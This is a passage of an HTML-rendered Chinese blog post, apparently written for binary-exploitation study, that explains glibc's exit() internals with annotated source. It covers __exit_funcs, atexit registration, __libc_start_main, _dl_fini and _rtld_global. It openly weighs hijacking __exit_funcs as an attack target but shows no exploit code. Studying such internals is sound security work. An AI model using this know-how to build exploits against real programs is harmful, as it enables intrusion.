class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx]; <span class="comment">//f指向对应析构函数的描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor) <span class="comment">//选择析构函数类型</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//三种函数指针</span></span><br><span class="line">    <span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两种类型不调用</span></span><br><span class="line">  <span class="keyword">case</span> ef_free:</span><br><span class="line">  <span class="keyword">case</span> ef_us:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//on类型的参数为注册时设定的参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_on:</span><br><span class="line">    onfct = f-&gt;func.on.fn; <span class="comment">//设置函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    onfct(status, f-&gt;func.on.arg); <span class="comment">//调用这个函数指针</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//at没有参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_at:</span><br><span class="line">    atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    atfct();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cxa类型则先为设定时的参数，再为状态码</span></span><br><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cxafct(f-&gt;func.cxa.arg, status); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//listp指向下一个exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个链表节点为libc .data段中的initial，不需要释放</span></span><br><span class="line"><span class="comment">//除此以外的节点都是malloc申请得到的, 所以需要释放</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//真正的exit系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考1-能否劫持-exit-funcs数组"><a href="#思考1-能否劫持-exit-funcs数组" class="headerlink" title="思考1:能否劫持__exit_funcs数组?"></a>思考1:能否劫持__exit_funcs数组?</h2><p>在exit调用<strong>run_exit_handlers()时下断点, 找到</strong>exit_funcs指针</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_165633.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_170143.png" alt=""></p><p>可以看到其中最重要的fns[0]被加密成乱码了,要想利用的话还要获得存储在fs:0x30的密钥,难度高,几乎难以利用</p><h2 id="exit-funcs如何添加析构函数"><a href="#exit-funcs如何添加析构函数" class="headerlink" title="__exit_funcs如何添加析构函数()"></a>__exit_funcs如何添加析构函数()</h2><p>既然难以攻击<strong>exit_funcs, 那么尝试从</strong>exit_funcs中的函数入手</p><p>我们首先要弄明白, __exit_funcs中的函数是怎么添加的</p><p>libc提供了一个接口: atexit()用来注册exit()时调用的析构函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DSO由GCC定义，用来识别模块的*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *__dso_handle __attribute__((__weak__));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册一个exit时调用的析构函数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cxa_atexit()是对internal_atexit()的封装</p><p>注意: __exit_funcs就是exit()时用的那个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册一个exit/共享库被卸载时调用的函数，只会被C++编译器生产的代码调用，C会通过atexit调用</span></span><br><span class="line"><span class="type">int</span> __cxa_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit(func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__cxa_atexit)</span><br></pre></td></tr></table></figure><p><strong>internel_atexit()通过</strong>new_exitfn()找到一个在__exit_funcs链表上注册析构函数的位置, 然后进行写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  参数:</span></span><br><span class="line"><span class="comment">    - func  析构函数指针</span></span><br><span class="line"><span class="comment">    - arg   参数指针</span></span><br><span class="line"><span class="comment">    - d     DSO</span></span><br><span class="line"><span class="comment">    - listp 析构函数数组链表指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> attribute_hidden __internal_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d, <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span> =</span> __new_exitfn(listp); <span class="comment">//先在__exit_funcs链表上添加一个描述析构函数的结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE(func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后设置分配到的这个结构体</span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*)(<span class="type">void</span> *, <span class="type">int</span>))func; <span class="comment">//函数指针</span></span><br><span class="line">  new-&gt;func.cxa.arg = arg;                        <span class="comment">//参数</span></span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  atomic_write_barrier();</span><br><span class="line">  new-&gt;flavor = ef_cxa;                         <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__new_exitfn()的逻辑大致为</p><ul><li>先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲</li><li>如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体</li><li>设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从listp上返回一个新的exit_function结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *__<span class="title">new_exitfn</span>(<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock(lock); <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找一个析构函数类型为ef_free的位置</span></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next) <span class="comment">//遍历链表，l指向当前节点, p指向l的前一个节点</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)           <span class="comment">//搜索l中的函数指针数组fns[32]</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free) <span class="comment">//有一个不是ef_free的就停止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">//在l中找到了, 停止链表遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只有全部都是ef_free才能走到这里 */</span></span><br><span class="line">    l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span>(l-&gt;fns) / <span class="keyword">sizeof</span>(l-&gt;fns[<span class="number">0</span>])) <span class="comment">//没有找到空闲位置</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    l==null 说明整个__exit_funcs中都没有ef_free</span></span><br><span class="line"><span class="comment">    i == sizeof(l-&gt;fns) / sizeof(l-&gt;fns[0]) 说明对于l节点, fns已经全部遍历了, 都没找到ef_free</span></span><br><span class="line"><span class="comment">    此时就需要插入一个新的exit_function_list节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(l != <span class="literal">NULL</span>);</span><br><span class="line">      p = (<span class="keyword">struct</span> exit_function_list *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> exit_function_list)); <span class="comment">//申请一个结构体, p指向新节点</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;next = *listp; <span class="comment">//头插法, 再__exit_funcs中插入一个节点</span></span><br><span class="line">        *listp = p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      r = &amp;p-&gt;fns[<span class="number">0</span>]; <span class="comment">//r指向新节点的第一个析构函数描述结构体</span></span><br><span class="line">      p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//找到空闲位置了, l节点中第i个为ef_free</span></span><br><span class="line">  &#123;</span><br><span class="line">    r = &amp;l-&gt;fns[i];</span><br><span class="line">    l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 此时这个函数位置的类型从空闲(ef_free)变为使用中(ef_us), 等待写入函数指针 */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    r-&gt;flavor = ef_us;</span><br><span class="line">    ++__new_exitfn_called;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock(lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="析构函数的注册—-libc-start-main"><a href="#析构函数的注册—-libc-start-main" class="headerlink" title="析构函数的注册—__libc_start_main()"></a>析构函数的注册—__libc_start_main()</h2><p><strong>__libc_start_main()</strong>函数初窥</p><ul><li>首先是其参数列表也就是_start()传递的参数, 我们中重点注意下面三个<ul><li>init: ELF文件 也就是main()的构造函数</li><li>fini: ELF文件 也就是main()的析构函数</li><li>rtld_fini: 动态链接器的析构函数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br><span class="line">&#123;</span><br><span class="line">    ...函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数体, __libc_start_mian()主要做了以下几件事</p><ul><li>为libc保存一些关于main的参数, 比如__environ…</li><li>通过atexit()注册fini 与 rtld_fini 这两个参数</li><li>调用init为main()进行构造操作</li><li>然后调用main()函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(...)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 保存main的返回地址 */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取环境变量指针, 并保存到libc的.data中</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存下栈顶 */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化TLS */</span></span><br><span class="line">  __pthread_initialize_minimal();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置stack guard */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard(_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置pointer gurad */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard(_dl_random, stack_chk_guard);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册动态链接器(ld.so.2)的析构函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely(rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行一些简单的libc初始化工作: 在libc中保存argc argv env三个参数 */</span></span><br><span class="line">  __libc_init_first(argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册ELF的fini函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果ELF有构造函数的话, 那么先调用init() */</span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init)(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 调用main()  */</span></span><br><span class="line">  result = main(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果main()返回后, __libc_start_main()回帮他调用exit()函数 */</span></span><br><span class="line">  <span class="built_in">exit</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们知道libc_start_mian()会在exit_funcs中放入下面两个函数</p><p><strong>ELF的fini函数</strong>和<strong>ld的rtld_fini函数</strong></p><p>然后会调用一个构造函数:</p><p><strong>init()</strong></p><h3 id="ELF的fini"><a href="#ELF的fini" class="headerlink" title="ELF的fini()"></a>ELF的fini()</h3><p>被编译在elf的text段中, 由_start()传递地址给__libc_start_main()</p><p>发现其是一个空函数,因为其只有在静态编译下才会起作用,故而动态编译该函数为空</p><p>静态编译时:该函数会逐一取出fini_array数组中的函数指针执行，该函数指针数组位于bss段上</p><h3 id="ELF的init"><a href="#ELF的init" class="headerlink" title="ELF的init()"></a><strong>ELF的init()</strong></h3><p>让我们思考一个问题: 如果只有fini与init的话, ELF只能有一个构造/ 析构函数</p><p>当具有多个构造析构函数时改怎么办呢?</p><p>ELF的解决方法是, 把所有的构造函数的指针放在一个段: .init_array中, 所有的析构函数的指针放在一个段 .fini_array中</p><p><strong>init()就负责遍历.init_array, 并调用其中的构造函数, 从而完成多个构造函数的调用</strong></p><h3 id="ld的rtdl-fini"><a href="#ld的rtdl-fini" class="headerlink" title="ld的rtdl_fini()"></a>ld的rtdl_fini()</h3><p>我们说完了.init_array, 那么对于.fini_array呢?</p><p>很明显不是ELF的fini()负责 , 因为他就是一个空函数, 那么就只能<u>由rtdl_fini来负责</u></p><p><strong><em>rtdl_fini实际指向_dl_fini()函数</em></strong>, 源码在dl-fini.c文件中, 会被编译到ld.so.2中</p><p>我们把进程空间中的一个单独文件, 称之为模块</p><p>ld.so.2会通过dl_open()把所需文件到进程空间中, 他会把所有映射的文件都记录在结构体_rtld_global中</p><p>当一个进程终止, ld.so.2自然需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><p><strong>一言以蔽之: _dl_fini()的功能就是调用进程空间中所有模块的析构函数</strong></p><h3 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="rtld_global结构体"></a>rtld_global结构体</h3><p>接着来看_rtld_global结构体, 这个结构体很复杂, 我们只看与本文相关的</p><p>_rtld_global一般通过宏GL来引用, 这个结构体定义在ld.so.2的data段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><ul><li>再看其结构体struct rtld_global的定义<ul><li>一些缩写的含义:<ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li></ul></li><li>struct rtld_global先以命名空间为单位建立了一个数组 _dl_ns[DL_NNS]</li><li>在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 映射模块的搜索表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">        <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">        <span class="type">size_t</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            __rtld_lock_define_recursive(, lock) <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="type">uint32_t</span> hashval;           <span class="comment">//符号hash值</span></span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">//名称</span></span><br><span class="line">                <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> * sym;      <span class="comment">//符号</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">            &#125; * entries;                   <span class="comment">//entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号</span></span><br><span class="line">            <span class="type">size_t</span> size;                   <span class="comment">//有多少个元素</span></span><br><span class="line">            <span class="type">size_t</span> n_elements;</span><br><span class="line">            <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">        &#125; _ns_unique_sym_table;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录命名空间变化的, debug用 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">    &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */</span></span><br><span class="line">    <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的</p><ul><li>ELF文件都是通过节的组织的, ld自然也延续了这样的思路,</li><li>l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 